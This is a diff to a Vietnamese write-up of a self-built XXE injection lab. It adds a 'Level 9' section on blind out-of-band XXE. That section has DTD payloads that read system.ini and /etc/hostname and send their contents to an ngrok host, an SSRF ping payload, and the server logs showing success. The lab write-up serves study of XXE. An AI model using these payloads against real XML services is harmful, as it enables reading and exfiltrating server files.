@@ -28,7 +28,6 @@ Lab này xử lý logic chính ở file `XmlParserService.java` với 7 levels v
 
 ### Source Code
 
-GitHub: https://github.com/pzhat/XXE_Injection_lab
 
 ### Khai thác từng level và POC
 #### Level 1:
@@ -217,7 +216,7 @@ Sau đó đưa payload khác gọi đến webhook với mong muốn là nó sẽ
 
 ![image](https://hackmd.io/_uploads/By5abkPhll.png)
 
-Thành công tạo ra lỗi kèm theo đó nó trả về dữ liệu.
+Thành công tạo ra lỗi kèm theo đó nó trả về dữ liệu ở đây là trường hợp Error Based.
 
 #### Level 6:
 
@@ -343,4 +342,131 @@ Tiến hành inject vào.
 
 ![image](https://hackmd.io/_uploads/HyAg9Jv2le.png)
 
-Thành công khai thác level 8 và cũng là level cuối cùng.
+Thành công khai thác level 8.
+
+#### Level 9:
+
+Đến với level 9 thì bây giờ sẽ là challenge thuần blind khi mà sau khi parse sẽ không trả về kết quả và sẽ không báo lỗi nữa.
+
+```java 
+ public String parseLevel9(String xml) {
+        try {
+            createVulnerableBuilder().parse(new InputSource(new StringReader(xml)));
+            return "Request processed.";
+        } catch (Exception e) {
+            // Lỗi bị "nuốt", chỉ trả về thông báo chung chung
+            return "Request processed.";
+        }
+    }
+```
+
+Nhưng ở đây sẽ vẫn tồn tại lỗ hổng tại vì vẫn sử dụng `createVulnerableBuilder()` nên hoàn toàn có thể tìm cách để thay vì đưa được output hiển thị ở lỗi như level 5,6 thì ta có thể thử sử dụng OOB (Out Of Band). Với mục đích đưa được output ra bên ngoài vì ở đây phần result không hiển thị rõ kết quả vè eror cũng bị chặn hết nên ta sẽ không thể error based nữa.
+
+Sau khi tham khảo các nguồn thì tôi sẽ thử OOB trường hợp này mình sẽ gửi result ra bằng http liệu xem nó sẽ trả về cái gì.
+
+![image](https://hackmd.io/_uploads/Sk-vgCo3xx.png)
+
+Tiến hành host 1 python server đến port 8000 ở folder mà ta để payload.
+
+![image](https://hackmd.io/_uploads/BkZqlConee.png)
+
+Sử dụng ngrok để listen port 8000 và tạo tunnel đưa nó ra ngoài.
+
+![image](https://hackmd.io/_uploads/Sk8TxAj3lx.png)
+
+Tạo file exploit.dtd với nội dung trên:
+
+```xml 
+<!ENTITY % file SYSTEM "file:///C:/Windows/system.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://eparchial-dahlia-edgier.ngrok-free.dev/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+![image](https://hackmd.io/_uploads/Sk3yG0i2gx.png)
+
+Tiến hành payload cho ngrok trỏ đến file và khi nó get về nó sẽ thực thi file dtd và mong nó sẽ trả result trong request.
+
+![image](https://hackmd.io/_uploads/rkx07fCo2lx.png)
+
+Có vẻ như thành công GET file nhưng không hề có thông tin nào được trả về. Ở đây sau khi thử vài cách về đọc file nhưng không hề được thì mình đang nghĩ là do cấu hình Spring không cho phép thực thì dtd đọc file nên mình sẽ thử cách khác là SSRF bằng cách thử ping.
+
+Vẫn như trên ta sẽ tạo python server sau đó đưa nó qua ngrok listen sau đó tạo file ping.dtd với nội dung:
+
+```xml 
+<!ENTITY % ping SYSTEM "https://eparchial-dahlia-edgier.ngrok-free.dev/ping-successful">
+```
+
+Payload này sẽ cố đọc ping.dtd, server lab hiểu lệnh bên trong (<!ENTITY % ping SYSTEM ".../ping-successful">) và đã thực thi nó. Nó sẽ gửi đi một request thứ hai đến địa chỉ /ping-successful.
+
+![image](https://hackmd.io/_uploads/ryENSAj3gl.png)
+
+Ta có kết quả sau khi tiến hành sử dụng payload:
+
+```xml 
+<?xml version="1.0" ?>
+<!DOCTYPE data [
+    <!ENTITY % oob SYSTEM "https://eparchial-dahlia-edgier.ngrok-free.dev/ping.dtd">
+    %oob;
+
+    %ping;
+]>
+<data>test</data>
+```
+
+**1. ::1 - - [02/Oct/2025 17:29:25] "GET /ping.dtd HTTP/1.1" 200 -**
+
+- Ý nghĩa: Server lab đã kết nối đến server python và tải thành công file ping.dtd. Status 200 có nghĩa là "OK".
+
+**2. ::1 - - [02/Oct/2025 17:29:25] "GET /ping-successful HTTP/1.1" 404 -**
+
+- Ý nghĩa: Đây là dòng quan trọng nhất. Sau khi đọc ping.dtd, server lab đã hiểu lệnh bên trong (<!ENTITY % ping SYSTEM ".../ping-successful">) và đã thực thi nó. Nó đã gửi đi một request thứ hai đến địa chỉ /ping-successful.
+
+Tại sao lại là 404? Vì trên server python không hề có file nào tên là ping-successful. Server python trả về lỗi "404 File Not Found" là hoàn toàn đúng.
+
+- Kết luận: Thành công sử dụng XXE để thực thi Blind SSRF vì ta có thể thấy xml payload trong ping.dtd vẫn được thực thi và trỏ đến xem có file `/ping-successful` không và từ đó có thể thấy xml trong đoạn vẫn được thực thi nhưng ở đây có khả năng cao do cấu hình của Spring không còn cho phép thực thi các lệnh như `file` nên không đọc file được.
+
+Bây giờ nếu windows không được ta sẽ chuyển sang thử môi trường linux để xem liệu có chạy được không.
+
+![image](https://hackmd.io/_uploads/HJlA5Mhhgx.png)
+
+Host python server lên.
+
+![image](https://hackmd.io/_uploads/H1akozh2lx.png)
+
+Chạy ngrok để listen localhost 8000 của python server.
+
+![image](https://hackmd.io/_uploads/Bkhzof23xx.png)
+
+Tạo file `exploit-linux.dtd` với nội dung:
+
+```xml 
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://eparchial-dahlia-edgier.ngrok-free.dev/%file;'>">
+%eval;
+%exfiltrate;        
+``
+
+Payload này sẽ giúp ta đọc dữ liệu của file `/etc/hostname`.
+
+Bây giờ ta sẽ bỏ payload vào trong level 9 để xem dữ liệu trả về ra sao.
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE data [
+    <!ENTITY % oob SYSTEM "https://eparchial-dahlia-edgier.ngrok-free.dev/exploit-linux.dtd">
+    %oob;
+]>
+<data>go</data>
+```
+
+![image](https://hackmd.io/_uploads/Byux2G3hll.png)
+
+![image](https://hackmd.io/_uploads/HyxM3z2ngl.png)
+
+Thành công đọc được file hostname.
+
+![image](https://hackmd.io/_uploads/r164hz33lx.png)
+
+Từ đây tôi khá chắc là nếu file hostname thành công mà những file dài không có kết quả thì khả năng cao là nếu file quá dài và nhiều kí tự thì sẽ khó để mà đọc được nên khả năng nếu sử dung ftp protocol thì khả năng cao sẽ có thể đọc được những file dài.
+
